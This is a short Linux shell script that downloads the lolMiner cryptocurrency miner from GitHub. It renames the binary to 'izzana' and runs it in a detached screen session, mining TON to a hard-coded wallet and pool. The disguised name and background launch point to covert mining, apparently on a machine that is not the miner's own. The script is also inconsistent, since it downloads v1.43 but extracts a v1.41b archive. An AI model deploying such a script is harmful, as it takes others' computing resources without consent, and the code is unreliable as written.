#!/bin/sh
nohup sudo apt-get update
nohup sudo apt install screen -y
nohup sudo apt-get install libpci3
nohup wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.43/lolMiner_v1.43_Lin64.tar.gz 
nohup tar -xvf lolMiner_v1.41b_Lin64.tar.gz
cd 1.43 
mv lolMiner izzana
screen -d -m ./izzana --algo TON --pool ton.hashrate.to:4003 --user EQA0Q3JaZgjKJ6QVzETgz3xYfalnLCx170Ey8cEGhsnyLkdI.cepetsugih
